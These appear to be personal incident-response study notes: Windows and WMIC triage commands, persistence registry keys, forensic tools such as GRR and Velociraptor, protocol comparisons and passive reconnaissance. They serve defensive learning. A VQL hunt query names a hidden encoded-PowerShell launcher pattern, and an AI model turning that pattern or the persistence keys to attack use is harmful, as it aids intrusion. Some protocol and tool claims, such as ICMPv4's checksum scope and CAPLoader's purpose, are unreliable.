### Preparation :
1- a skilled IR team
2- security awareness and training
3- good police
4- Breach and incident plan
5-maintaining a chain of custody
6- tools ( EDR - siem - etc ....)
7- IH starter kit ( software and hardware )

### Categorize network to :
Network perimeter ( DMZ , NIPS )
host perimeter ( HIPS )
host level ( AV n EDR )
application level ( app logs )

### Containment : 
1- short term containment
2- system back-up
3- long term containment


---
### **1. Command-Line Network Tools (CMD/PowerShell)**  
####  `ping` 
- Checks network connectivity to a host.  
- **Example:** `ping example.com`  

####  `tracert` (Trace Route)  
- Maps the path packets take to reach a destination.  
- **Example:** `tracert 8.8.8.8`  

####  `nslookup` / `dig` (DNS Lookup)
- Queries DNS records (useful for detecting DNS poisoning).  
- **Example:** `nslookup malicious-domain.com`  

####  `netstat` (Network Statistics)
- Lists active connections, listening ports, and PID (Process ID).  
- **Flags:**  
  - `netstat -ano` (All connections + PIDs)  
  - `netstat -b` (Shows executables making connections)  

####  `arp` (ARP Cache)
- Displays the **ARP table** (IP to MAC mappings).  
- **Example:** `arp -a`  

####  `route` (Routing Table) 
- Shows/manipulates the **Windows routing table**.  
- **Example:** `route print`  

####  `ipconfig` (IP Configuration)  
- Displays network adapter details (IP, DHCP, DNS).  
- **Flags:**  
  - `ipconfig /all` (Detailed info)  
  - `ipconfig /release` & `/renew` (DHCP reset)  

####  `netsh` (Network Shell - Advanced Configs) 
- Configures **firewall, interfaces, and logging**.  
- **Examples:**  
  - `netsh advfirewall show all`  
  - `netsh interface show interface`  

####  `tasklist` & `taskkill` (Process Management)
- Lists running processes (`tasklist`).  
- Kills malicious processes (`taskkill /PID 1234 /F`).  

####  `whoami` & `net user` (User Enumeration)  
- `whoami` → Current user.  
- `net user` → Lists all local users.  
---

### **RTIR (Request Tracker for Incident Response) – Overview**  
**RTIR (Request Tracker for Incident Response)** is an **open-source incident management tool** built on the **Request Tracker (RT)** platform. It is designed specifically for **Security Operations Centers (SOCs), CERTs (Computer Emergency Response Teams), and incident response teams** to track, manage, and respond to security incidents efficiently.  

## Key Features of RTIR  
### **1. Incident Ticketing & Tracking**  
- Creates **tickets for security incidents** (malware, breaches, phishing, etc.).  
- Assigns incidents to analysts with **priority levels (Low, Medium, High, Critical)**.  

### **2. Collaboration & Workflow Automation**  
- Allows **team communication** via ticket comments.  
- Supports **custom workflows** for different incident types.  

### **3. Integration with Threat Intelligence**  
- Can be linked with **SIEMs, MISP (Threat Intel Platforms), and email alerts**.  
- Helps in **auto-tagging & categorizing incidents** (e.g., malware, DDoS).  

### **4. Reporting & Metrics**  
- Generates **incident response reports** (MTTR – Mean Time to Respond).  
- Tracks **SLA compliance** (e.g., time to resolve incidents).  

### **5. Forensic & Evidence Management**  
- Attach **logs, PCAPs, malware samples** to tickets.  
- Maintains an **audit trail** for compliance (ISO 27001, NIST).  

## How RTIR Helps in Incident Management?  
| **Phase**           | **RTIR Functionality**                                            |
| ------------------- | ----------------------------------------------------------------- |
| **Preparation**     | - Pre-defined ticket templates <br> - Team roles & permissions    |
| **Identification**  | - Ingest alerts from SIEM/IDS <br> - Manual ticket creation       |
| **Containment**     | - Assign tasks to analysts <br> - Track containment actions       |
| **Eradication**     | - Document malware removal steps <br> - Patch management tracking |
| **Recovery**        | - Verify system restoration <br> - Close tickets post-recovery    |
| **Lessons Learned** | - Generate reports <br>- Update playbooks                         |

---

# Incident handling forms :

### **1. Incident Contact List**
**Purpose**: Ensure rapid communication during a security incident.  
**Contents**:
- **Internal Teams**: SOC, IT, Legal, PR, Management.
- **External Contacts**: Law enforcement (e.g., FBI, CERT), vendors, ISPs.
- **Escalation Paths**: Who to notify for critical incidents (e.g., CISO).  
    **ECIH Focus**: Part of the **Preparation** phase.

### **2. Incident Detection Form**
**Purpose**: Document how the incident was identified.  
**Contents**:
- **Detection Source**: SIEM alert, IDS/IPS, user report, threat intel.
- **Initial Indicators**: Unusual traffic, malware signatures, failed logins.
- **Timestamp**: When/where the incident was detected.  
    **ECIH Focus**: **Identification** phase (NIST Step 2).

### **3. Incident Casualties Form**
**Purpose**: Assess impact on assets/data.  
**Contents**:
- **Affected Systems**: Servers, endpoints, cloud instances.
- **Data Compromised**: PII, financial records, intellectual property.
- **Business Impact**: Downtime, financial loss, reputational damage.  
    **ECIH Focus**: Critical for **risk assessment** during Identification/Containment.

### **4. Incident Containment Form**
**Purpose**: Track actions to limit damage.  
**Contents**:
- **Short-Term Containment**: Disconnect infected systems, block IPs.
- **Long-Term Containment**: Patch vulnerabilities, segment networks.
- **Containment Challenges**: Business trade-offs (e.g., downtime vs. risk).  
    **ECIH Focus**: **Containment** phase (NIST Step 3).

### **5. Incident Eradication Form**
**Purpose**: Record steps to eliminate the threat.  
**Contents**:
- **Malware Removal**: Tools used (e.g., EDR, manual deletion).
- **System Hardening**: Password resets, firewall rule updates.
- **Forensic Preservation**: Evidence retained for legal/analysis.  
    **ECIH Focus**: **Eradication** phase (NIST Step 4).
---

### **WMIC (Windows Management Instrumentation Command-line) Tool**  
**WMIC** is a legacy command-line utility in Windows that provides a powerful interface for **system administration, diagnostics, and incident response** using **WMI (Windows Management Instrumentation)**. It allows querying system information, managing processes, services, hardware, and more.  

#### **Key Features of WMIC**  
- **System/Process Management**: Query running processes, services, and hardware.  
- **Remote Administration**: Manage other Windows machines (if permissions allow).  
- **Incident Response**: Useful for **forensics, malware analysis, and live system checks**.  

### **Common WMIC Commands for SOC Analysts**  

#### **1. System Information**  
```cmd
wmic computersystem list brief   # OS, manufacturer, model  
wmic os get name,version         # OS details  
wmic bios get serialnumber       # BIOS serial (useful for asset tracking)  
```

#### **2. Process Management (Malware Hunting)**  
```cmd
wmic process list brief         # List all processes (PID, name, path)  
wmic process where name="malware.exe" delete  # Kill a process  
wmic process get executablepath,processid,name  # Check suspicious binaries  
```

#### **3. User & Login Activity**  
```cmd
wmic useraccount list full      # All user accounts (SID, disabled status)  
wmic netlogin list brief        # Network login history (limited)  
```

#### **4. Services & Startup Programs**  
```cmd
wmic service list brief         # List all services (name, state, path)  
wmic startup list full          # Programs running at startup  
```

#### **5. Hardware & Drivers**  
```cmd
wmic diskdrive list brief       # Hard drives (model, size)  
wmic logicaldisk get name,freespace  # Disk free space  
wmic driver get name,version    # Installed drivers  
```

#### **6. Network Information**  
```cmd
wmic nicconfig list brief       # Network adapters (IP, MAC, DHCP)  
wmic netuse list brief          # Mapped network drives  
```

#### **7. Patch & Software Inventory**  
```cmd
wmic qfe list                   # Installed Windows updates (KB numbers)  
wmic product get name,version   # Installed software  
```


### **WMIC in Incident Response (SOC Use Cases)**  
 **Malware Analysis**:  
   - Find hidden processes (`wmic process`).  
   - Check auto-start programs (`wmic startup`).  
 **Forensic Triage**:  
   - Identify suspicious services (`wmic service where path like "%temp%"`).  
   - Track remote logins (`wmic netlogin`).  
 **Asset Management**:  
   - Extract hardware details (serial numbers, OS version).  

### **Limitations & Modern Alternatives**  
- **Deprecated**: WMIC is **removed in Windows 11 22H2+** (use PowerShell alternatives).  
- **PowerShell Replacements**:  
  ```powershell
  Get-WmiObject Win32_Process | Select Name, ProcessId, ExecutablePath  
  Get-CimInstance Win32_Service | Where-Object {$_.PathName -like "*temp*"}  
  ```


---
# windows cheat sheet

1- users accounts :

```
C:\Users\HP>net --help
The syntax of this command is:

NET
    [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |
      HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START |
      STATISTICS | STOP | TIME | USE | USER | VIEW ]
```

2- Process :

```
C:\Users\HP>tasklist
C:\Users\HP>wmic process list full 
```

3- Services :

```
C:\Users\HP>net start
C:\Users\HP>sc query | more
C:\Users\HP>tasklist /svc
```

4- scheduled tasks 

```
C:\Users\HP>schtasks
```


5- Startup folders

1. **Current User**:
    - `%AppData%\Microsoft\Windows\Start Menu\Programs\Startup`
    - `C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

2. **All Users (System-Wide)**:
    - `%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup`
    - `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

**The registry run keys perform the same action, but can be located in four different locations:**

- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`

**The following Registry keys can be used to set startup folder items for persistence:**

- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**The following Registry keys can control automatic startup of services during boot:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices`

6- file shares :

```
C:\Users\HP>net view \\127.0.0.1
```

7- firewall settings :

```
C:\Users\HP>netsh advfirewall show currentprofile
```

8- log entries :

```
C:\Users\system>wevtutil qe security
```

---
### **Windows Administrative Tools Quick Reference**

|**Tool**|**Command**|**Purpose**|**SOC Use Case**|
|---|---|---|---|
|**User Accounts**|`lusrmgr.msc`|Manage local users/groups (enable/disable accounts, reset passwords).|Investigate rogue/local accounts.|
|**Processes**|`taskmgr.exe`|View/kill processes, check CPU/memory usage, startup programs.|Identify malware processes.|
|**Services**|`services.msc`|Manage Windows services (start/stop, set startup type: Automatic/Manual).|Stop malicious services (e.g., C2 beacons).|
|**Event Logs**|`eventvwr.msc`|View Security, System, Application logs (e.g., Event ID 4625 for failed logins).|Hunt for brute-force attacks.|
|**System Config**|`msconfig.exe`|Manage boot options, startup programs, services (via "Startup" tab).|Disable suspicious startup items.|
|**Computer Mgmt**|`compmgmt.msc`|Central hub for disk mgmt, services, event logs, user accounts.|Quick access to multiple admin tools.|
|**System Info**|`msinfo32.exe`|Detailed hardware/software inventory (OS version, drivers, IRQ conflicts).|Gather forensic system details.|
|**Resource Monitor**|`resmon.exe`|Real-time monitoring of CPU, memory, disk, network usage.|Detect unusual resource spikes (e.g., malware).|
|**Registry Editor**|`regedt32.exe`|Edit Windows Registry (manual analysis/modification).|Check `Run` keys for persistence.|
|**Firewall**|`wf.msc`|Configure inbound/outbound rules (block/allow traffic).|Block malicious IPs/ports.|



# For Linux (useful investigation software)

### [chkrootkit](https://www.kali.org/tools/chkrootkit/)

The chkrootkit security scanner searches for signs that the system is infected with a ‘rootkit’. Rootkits are a form of malware that seek to exploit security flaws to grant unauthorised access to a computer or its services, generally for malicious purposes.

chkrootkit can identify signs of over 70 different rootkits (see the project’s website for a list).

Please note that an automated tool like chkrootkit can never guarantee a system is uncompromised. Nor does every report always signify a genuine problem: human judgement and further investigation will always be needed to assure the security of your system.

### [Tripwire](https://github.com/Tripwire/tripwire-open-source) & [AIDE](https://aide.github.io/): File Integrity Monitoring (FIM) Tools

#### **1. Tripwire**
- **Purpose**: Monitors file/system changes to detect unauthorized modifications (malware, breaches, misconfigurations).
- **How It Works**:
    - Creates a **cryptographic baseline** (hashes) of critical files (e.g., `/bin`, `/etc`).
    - Alerts when files are **added, modified, or deleted** vs. the baseline.
- **Key Features**:
    - **Policy-based checks**: Custom rules for files/directories.
    - **Alerting**: Email/SIEM integration for deviations.
    - **Compliance**: Meets PCI-DSS, NIST, CIS benchmarks.
- **SOC Use Case**:
    - Detect **web defacement**, **malware drops**, or **unauthorized config changes**.

#### **2. AIDE (Advanced Intrusion Detection Environment)**
- **Purpose**: Open-source alternative to Tripwire for Linux/UNIX systems.
- **How It Works**:
    - Generates a **database of file hashes/permissions** (initial scan).
    - Compares current state to the database to flag changes.
- **Key Features**:
    - **Supports multiple hash algorithms** (SHA-1, MD5).
    - **Configurable rules**: Exclude directories like `/tmp`.
    - **Logging**: Outputs to `/var/log/aide` for analysis.
- **SOC Use Case**:
    - Identify **backdoor installations** or **tampered system binaries**.
    - 
### **Comparison: Tripwire vs. AIDE**

| **Feature**       | **Tripwire**                            | **AIDE**                          |
| ----------------- | --------------------------------------- | --------------------------------- |
| **License**       | Commercial (Open Source version exists) | Open-Source (GPL)                 |
| **OS Support**    | Linux, Windows, macOS                   | Linux/UNIX only                   |
| **Configuration** | Complex policy files                    | Simpler config (`/etc/aide.conf`) |
| **Integration**   | SIEM, enterprise tools                  | Manual log parsing                |

---

### **GRR (Google Rapid Response) - Incident Response Framework**  

**[GRR](https://www.grr-response.com/)** is an **open-source remote live forensics and incident response tool** developed by Google. It enables security teams to **remotely investigate endpoints** (Windows, macOS, Linux) at scale, collect forensic artifacts, and analyze compromised systems without physical access.  

## **Key Features of GRR**  

### **1. Remote Forensic Data Collection**  
- **File System Access**: Download files, directory listings, and analyze timestamps.  
- **Memory Acquisition**: Dump RAM for volatile artifact analysis.  
- **Registry & Logs**: Extract Windows Registry hives, event logs, and browser history.  
- **Process & Network Analysis**: List running processes, network connections, and open sockets.  

### **2. Live Triage & Hunting**  
- **YARA Scanning**: Detect malware signatures in memory/files.  
- **Timeline Analysis**: Reconstruct attack timelines using file MACB (Modified/Accessed/Changed/Birth) times.  
- **API Hooks & Persistence Checks**: Identify malicious auto-start entries (e.g., `Run` keys, cron jobs).  

### **3. Scalable & Asynchronous**  
- **Agent-Based**: Lightweight client (`grr-client`) deployed on endpoints.  
- **Server-Managed**: Centralized web UI (Python-based) for managing investigations.  
- **Fleet-Wide Queries**: Run searches across thousands of machines simultaneously.  

### **4. Integration-Friendly**  
- **SIEM & SOAR**: Export data to Splunk, ELK, Chronicle, or custom tools.  
- **Automation**: Scriptable via API (Python client library).  

## **How GRR Works?**  
1. **Deploy Agents** (`grr-client`) on endpoints.  
2. **Admin Console** schedules tasks (e.g., "Collect all `cmd.exe` executions").  
3. **Clients** asynchronously respond with data (even if offline initially).  
4. **Analyst** reviews collected artifacts in the **web UI** or exports for deeper analysis.  


## **Use Cases for SOC/IR Teams**  
**Malware Investigations**:  
   - Retrieve malware samples from infected hosts.  
   - Scan memory with YARA rules.  
**Data Exfiltration Detection**:  
   - Check for unusual file downloads (e.g., `*.zip`, `*.txt` in `Downloads`).  
**Lateral Movement**:  
   - Audit `RDP`, `PsExec`, or `WMI` execution logs.  
**Compliance Audits**:  
   - Verify endpoint configurations (e.g., "Is PowerShell logging enabled?").  


## **GRR vs. Other IR Tools**  
| **Tool**        | **GRR**                       | **Velociraptor**             | **Osquery**             |
| --------------- | ----------------------------- | ---------------------------- | ----------------------- |
| **Type**        | Agent-based, async collection | Real-time live response      | SQL-based querying      |
| **Scalability** | Designed for large fleets     | Medium-scale deployments     | Best for ad-hoc queries |
| **Forensics**   | Deep file/memory analysis     | Flexible artifact collection | Lightweight checks      |
| **Complexity**  | Moderate (Python server)      | Low (Go-based)               | Very low                |


## **Example Commands (Admin UI)**  
- **Collect a file**:  
  ```python
  flow.StartFlow(client_id="C.1234", flow_name="GetFile", filepath="C:\\Windows\\Temp\\malware.exe")  
  ```  
- **Scan memory for malware**:  
  ```python
  flow.StartFlow(client_id="C.1234", flow_name="YaraScan", yara_rule="rule CobaltStrike { ... }")  
  ```  

## **Limitations**  
- **No Real-Time Response**: Data collection is async (not ideal for blocking live attacks).  
- **Steep Learning Curve**: Requires Python knowledge for advanced use.  
- **Resource Intensive**: Large-scale deployments need robust server infrastructure.  

### **Why Choose GRR?**  
- **Enterprise-Ready**: Built by Google for large environments.  
- **Forensic Depth**: Goes beyond simple "file pulls" (memory, registry, APIs).  
- **Open-Source**: Self-hosted, no vendor lock-in.  

**Get Started**: [GRR GitHub](https://github.com/google/grr)  

---

### **Velociraptor IR Framework - Overview**  
**Velociraptor** is a **powerful, open-source digital forensics and incident response (DFIR)** tool designed for **real-time endpoint monitoring, live forensics, and threat hunting**. It enables SOC teams to **rapidly investigate compromised systems** across Windows, Linux, and macOS.  

---

## **Key Features**  

### **1. Real-Time Live Response**  
- **Interactive Shell**: Execute commands remotely (e.g., `pslist`, `netstat`).  
- **Memory & Disk Forensics**: Acquire RAM dumps, files, and registry hives on demand.  
- **YARA Scanning**: Detect malware in memory and files.  

### **2. Flexible Query Language (VQL)**  
- **Custom Artifact Collection**: Write queries to fetch specific forensic data (e.g., `processes`, `scheduled tasks`, `browser history`).  
- **Example Query**:  
  ```sql
  SELECT * FROM Artifact.Windows.System.PSList()  
  WHERE Name =~ "malware.exe"  
  ```  

### **3. Automated Triage & Hunting**  
- **Pre-built Artifacts**: Collect common forensic data (e.g., `Windows.EventLogs`, `Linux.SSH.AuthorizedKeys`).  
- **Timeline Analysis**: Reconstruct attack timelines using file MACB times.  

### **4. Scalable & Lightweight**  
- **Agent-Based**: Minimal footprint (~10MB), written in **Go** (cross-platform).  
- **Server-Client Model**: Centralized management with a web UI.  
- **Offline Support**: Queues tasks for agents that reconnect later.  

### **5. Integration & Extensibility**  
- **SIEM/SOAR**: Export data to Splunk, Elasticsearch, or custom tools.  
- **API-Driven**: Automate investigations with Python/REST.  

---

## **How Velociraptor Works?**  
1. **Deploy Agent** (`velociraptor client`) on endpoints.  
2. **Admin Console** schedules real-time or scheduled collections.  
3. **Agents Respond Instantly** with forensic data (processes, files, logs).  
4. **Analyst Reviews** results in the **web UI** or exports for deeper analysis.  

---

## **Use Cases for SOC/IR Teams**  
 **Incident Response**  
   - Investigate breaches (e.g., ransomware, C2 beacons).  
   - Extract malware samples from infected hosts.  
 **Threat Hunting**  
   - Hunt for persistence mechanisms (e.g., `Run` keys, cron jobs).  
   - Detect lateral movement (e.g., `RDP`, `WMI` logs).  
 **Compliance Audits**  
   - Verify endpoint security settings (e.g., `LSASS protection`, `USB history`).  

---

## **Velociraptor vs. GRR vs. Osquery**  
| **Feature**    | **Velociraptor**    | **GRR**                 | **Osquery**             |
| -------------- | ------------------- | ----------------------- | ----------------------- |
| **Speed**      | Real-time           | Async (delayed)         | Real-time               |
| **Language**   | VQL (SQL-like)      | Python                  | SQL                     |
| **Forensics**  | Deep (memory, disk) | Deep (async collection) | Lightweight (logs only) |
| **Deployment** | Lightweight (Go)    | Heavy (Python server)   | Very lightweight        |
| **Use Case**   | IR & Threat Hunting | Large-scale forensics   | Compliance monitoring   |

---

## **Example Commands (VQL)**  
- **List suspicious processes**:  
  ```sql
  SELECT * FROM Artifact.Windows.System.PSList()  
  WHERE CommandLine =~ "powershell -nop -w hidden -e"  
  ```  
- **Check persistence locations**:  
  ```sql
  SELECT * FROM Artifact.Windows.Registry.Run()  
  ```  

---

## **Limitations**  
- **No Built-in EDR**: Focuses on forensics, not real-time blocking.  
- **Learning Curve**: VQL requires training for complex queries.  

---

### **Why Choose Velociraptor?**  
- **Blazing Fast**: Real-time responses critical for IR.  
- **Extensible**: Custom artifacts fit unique environments.  
- **Open-Source**: Self-hosted, no vendor lock-in.  

**Get Started**: [Velociraptor GitHub](https://github.com/Velocidex/velociraptor)  

---

the type of 802.11 packets are :
1- management 
2- control
3- Data

### **Comparison Between ICMPv4 and ICMPv6**  

ICMP (Internet Control Message Protocol) is used for **error reporting, diagnostics, and network management** in IP networks. While **ICMPv4** is used with **IPv4**, **ICMPv6** is designed for **IPv6** and includes additional functionalities.  

---

## **🔹 Key Differences Between ICMPv4 and ICMPv6**  

| **Feature**            | **ICMPv4** (IPv4)                                                              | **ICMPv6** (IPv6)                                                                                                         |
| ---------------------- | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------- |
| **Purpose**            | Error reporting, diagnostics (e.g., `ping`, `traceroute`).                     | Same as ICMPv4 + **Neighbor Discovery (NDP)**, **Path MTU Discovery**, and **Multicast Listener Discovery (MLD)**.        |
| **Message Types**      | Types 0-255 (e.g., `Echo Request/Reply` = 8/0, `Destination Unreachable` = 3). | Types 1-255, but some repurposed (e.g., `Echo Request/Reply` = 128/129, `Neighbor Solicitation/Advertisement` = 135/136). |
| **Error Reporting**    | Reports errors like `Host Unreachable`, `Time Exceeded`.                       | Similar but with more detailed codes (e.g., `Address Unreachable`).                                                       |
| **Neighbor Discovery** | Uses **ARP** (Layer 2) for MAC resolution.                                     | Built into ICMPv6 (**NDP** replaces ARP).                                                                                 |
| **Multicast Handling** | Limited multicast support.                                                     | Uses **MLD (Multicast Listener Discovery)** for efficient multicast management.                                           |
| **Fragmentation**      | Routers can fragment packets.                                                  | Only source nodes fragment (Path MTU Discovery required).                                                                 |
| **Security**           | No built-in security (vulnerable to attacks like Smurf).                       | Includes **IPsec support** for authentication.                                                                            |
| **Checksum**           | Covers only the ICMP header.                                                   | Covers **ICMPv6 header + IPv6 pseudo-header** (more robust).                                                              |

---

## **🔹 Common ICMPv4 & ICMPv6 Messages**  

### **ICMPv4**  
- **Echo Request/Reply (Type 8/0)** → `ping`  
- **Destination Unreachable (Type 3)** → Host/Port/Network unreachable  
- **Time Exceeded (Type 11)** → `traceroute`  
- **Redirect (Type 5)** → Better route available  

### **ICMPv6**  
- **Echo Request/Reply (Type 128/129)** → `ping6`  
- **Neighbor Solicitation/Advertisement (Type 135/136)** → Replaces ARP  
- **Router Solicitation/Advertisement (Type 133/134)** → Auto-configuration  
- **Destination Unreachable (Type 1)** → Similar to ICMPv4 but more detailed  

---

## **🔹 SOC Use Cases**  
✅ **Network Troubleshooting**:  
   - `ping` (ICMPv4) vs. `ping6` (ICMPv6).  
   - `traceroute` (ICMPv4) vs. `tracert6` (ICMPv6).  
✅ **Security Monitoring**:  
   - Detect **ICMP-based attacks** (Smurf, Ping Flood).  
   - ICMPv6 **Neighbor Discovery attacks** (RA Spoofing).  
✅ **IPv6 Migration**:  
   - ICMPv6 is **mandatory** for IPv6 (unlike optional ICMPv4).  

---

## **🔹 Key Takeaways**  
1. **ICMPv6 does more** (replaces ARP, handles multicast, auto-configuration).  
2. **ICMPv4 is simpler** but lacks IPv6 features.  
3. **Security**: ICMPv6 supports IPsec; ICMPv4 is often blocked due to abuse.  



---
Here’s a **clear, concise comparison table** between **IPv4 and IPv6**:

| **Feature**               | **IPv4**                                  | **IPv6**                                  |
|--------------------------|------------------------------------------|------------------------------------------|
| **Address Length**       | 32-bit (4 bytes)                         | 128-bit (16 bytes)                       |
| **Address Format**       | Dotted decimal (e.g., `192.168.1.1`)     | Hexadecimal (e.g., `2001:0db8:85a3::8a2e`) |
| **Address Space**        | ~4.3 billion addresses                  | ~340 undecillion addresses              |
| **Header Size**          | 20-60 bytes (variable)                  | 40 bytes (fixed)                        |
| **Fragmentation**        | Done by routers                         | Done only by the sender                 |
| **NAT (Network Address Translation)** | Required (due to scarcity) | Not needed (large address space)       |
| **Security**             | Optional (IPsec)                        | Built-in (IPsec mandatory)              |
| **Checksum**             | Present (in header)                     | Removed (redundant due to lower-layer checks) |
| **Multicast**            | Optional                                | Native support                          |
| **Broadcast**            | Uses broadcast addresses                | Replaced with multicast                 |
| **Configuration**        | Manual or DHCP                          | Auto-configuration (SLAAC) + DHCPv6     |
| **DNS Resolution**       | Uses A records                          | Uses AAAA records                       |
| **ICMP**                 | ICMPv4 (separate from IP)               | ICMPv6 (integrated, replaces ARP)       |
| **Mobility Support**     | Limited (complex)                       | Built-in (better for mobile devices)    |
| **QoS (Quality of Service)** | Uses ToS (Type of Service) field   | Uses Flow Label field                   |
| **Adoption**             | Dominant (legacy)                       | Growing (mandatory for modern networks) |

### **Key Takeaways:**
1. **IPv6 solves IPv4’s address exhaustion** with a vastly larger space.
2. **Simpler header** in IPv6 improves routing efficiency.
3. **Built-in security (IPsec)** and **auto-configuration** make IPv6 more robust.
4. **No NAT** in IPv6 simplifies end-to-end connectivity.

---

Here's a breakdown of the terms you mentioned:

### **RPC (Remote Procedure Call)**
RPC is a protocol that allows a program to execute a procedure (function/subroutine) on another machine across a network as if it were calling a local function. It abstracts the complexities of network communication.

---

### **1. ONC RPC (Open Network Computing RPC)**
- Developed by **Sun Microsystems** (now Oracle).
- Also known as **Sun RPC**.
- Used in **NFS (Network File System)**.
- Uses **XDR (External Data Representation)** for data serialization.
- Typically runs on **port 111 (portmapper)**.

### **2. DCE RPC (Distributed Computing Environment RPC)**
- Developed by **The Open Group** as part of the **DCE framework**.
- Used in **Microsoft’s early RPC implementations** before MSRPC.
- Supports **UUIDs (Universally Unique Identifiers)** for interface identification.
- Used in protocols like **Active Directory (partly)** and older Windows services.

---

## **MSRPC Implementations (Microsoft RPC)**
Microsoft extended DCE RPC into **MSRPC**, which is used in Windows environments. Key implementations include:

### **1. RPC over SMB (Named Pipes)**
- Uses **Server Message Block (SMB)** protocol for transport.
- Commonly used in **Windows file sharing & internal services**.
- Runs over **TCP/445 (SMB)** or **TCP/139 (NetBIOS)**.
- Example: **PsExec** uses RPC over SMB.

### **2. DCOM (Distributed Component Object Model)**
- Extends **COM (Component Object Model)** over a network.
- Allows objects to be accessed remotely.
- Uses **RPC for communication**.
- Vulnerable to attacks like **DCOM lateral movement** (e.g., **MMC20.Application** exploit).

### **3. RPC over HTTP/s (Remote Procedure Call over HTTP)**
- Encapsulates RPC traffic inside **HTTP/HTTPS**.
- Used for **remote management** (e.g., Exchange Server, Outlook Anywhere).
- Runs on **TCP/80 (HTTP)** or **TCP/443 (HTTPS)**.
- Microsoft’s implementation is called **"RPC over HTTP Proxy"**.

### **Summary Table**
| **Type**       | **Protocol/Transport** | **Port(s)** | **Common Uses** |
|---------------|----------------------|------------|----------------|
| **ONC RPC**   | UDP/TCP              | 111 (portmapper) | NFS, Unix/Linux systems |
| **DCE RPC**   | UDP/TCP              | 135 (EPM) | Older Windows, DCE services |
| **RPC over SMB** | SMB (Named Pipes) | 445, 139 | Windows file sharing, PsExec |
| **DCOM**      | RPC + DCE            | Dynamic (via EPM) | Remote object access |
| **RPC over HTTP/s** | HTTP/HTTPS | 80, 443 | Exchange, Outlook remote access |

---
# **Network Flow Analysis Tools**

### **1. YAF (Yet Another Flowmeter)**
- **Purpose**: High-performance flow collection and analysis.
- **Developed By**: CERT/NetSA (Cybersecurity team at Carnegie Mellon).
- **Key Features**:
  - Processes **packet captures (PCAP)** into **IPFIX/NetFlow** records.
  - Supports **deep packet inspection (DPI)** for application identification.
  - Can export flows to **SiLK** for further analysis.
- **Use Case**: Large-scale network monitoring, cybersecurity forensics.
- **Website**: [https://tools.netsa.cert.org/yaf/](https://tools.netsa.cert.org/yaf/)

---

### **2. SiLK (System for Internet-Level Knowledge)**
- **Purpose**: Efficient storage and analysis of flow data.
- **Developed By**: CERT/NetSA.
- **Key Features**:
  - Optimized for **high-volume flow data** (e.g., NetFlow, IPFIX).
  - Uses **binary data formats** for fast querying.
  - Includes tools like `rwfilter`, `rwstats`, and `rwcut` for analysis.
- **Use Case**: Network traffic analysis, intrusion detection, large-scale security monitoring.
- **Website**: [https://tools.netsa.cert.org/silk/](https://tools.netsa.cert.org/silk/)

---

### **3. FlowViewer**
- **Purpose**: Web-based flow data visualization.
- **Key Features**:
  - Works with **NetFlow v5/v9**, IPFIX, and sFlow.
  - Provides **graphical dashboards** (time-series, top talkers, geo-IP).
  - Supports filtering and drill-down analysis.
- **Use Case**: Network administrators needing a GUI for flow analysis.
- **Website**: [https://sourceforge.net/projects/flowviewer/](https://sourceforge.net/projects/flowviewer/)

---

### **4. CAPLoader**
- **Purpose**: Analyzes **NetFlow, sFlow, and IPFIX** data.
- **Key Features**:
  - Supports **real-time and historical** flow analysis.
  - Includes **traffic anomaly detection**.
  - Can integrate with **Elasticsearch** for log storage.
- **Use Case**: Enterprise network monitoring, security operations.
- **Website**: [https://www.caploader.com/](https://www.caploader.com/)

---

### **5. nfdump**
- **Purpose**: Command-line tool for **NetFlow v5/v9/IPFIX** analysis.
- **Key Features**:
  - Reads flows collected by **nfcapd** (NetFlow capture daemon).
  - Supports **aggregation, filtering, and statistics** (e.g., top talkers).
  - Outputs in **CSV, plain text, or binary** formats.
- **Use Case**: Network forensics, bandwidth monitoring, security investigations.
- **Website**: [https://github.com/phaag/nfdump](https://github.com/phaag/nfdump)

---

### **Comparison Table**
| Tool         | Data Format Support | Key Strengths | Best For |
|--------------|---------------------|--------------|----------|
| **YAF**      | IPFIX, NetFlow      | High-speed DPI, SiLK integration | Large-scale flow processing |
| **SiLK**     | NetFlow, IPFIX      | Fast querying, big data analysis | Security forensics |
| **FlowViewer** | NetFlow, sFlow     | Web-based GUI, visualizations | Admins needing dashboards |
| **CAPLoader** | NetFlow, IPFIX, sFlow | Real-time monitoring, anomaly detection | Enterprise SOCs |
| **nfdump**   | NetFlow, IPFIX      | CLI-based, flexible filtering | Network forensics |

---

### **Passive Reconnaissance Techniques & Defenses**  

Passive reconnaissance involves gathering information about a target **without direct interaction**, making it hard to detect. Attackers use it to plan attacks (e.g., phishing, exploits). Below are common techniques and how to defend against them.  

---

## **🔍 Common Passive Recon Techniques**  

### **1. Open-Source Intelligence (OSINT)**  
- **Technique**:  
  - Harvesting public data from:  
    - **Social Media** (LinkedIn, Twitter) → Employee roles, tech stack.  
    - **Job Postings** (e.g., "Seeking AWS engineer") → Infra clues.  
    - **WHOIS Lookups** → Domain ownership, IP ranges.  
    - **GitHub/Code Repos** → Exposed API keys, credentials.  
- **Example Tools**:  
  - [theHarvester](https://github.com/laramies/theHarvester), [Maltego](https://www.maltego.com/), [Shodan](https://www.shodan.io/).  

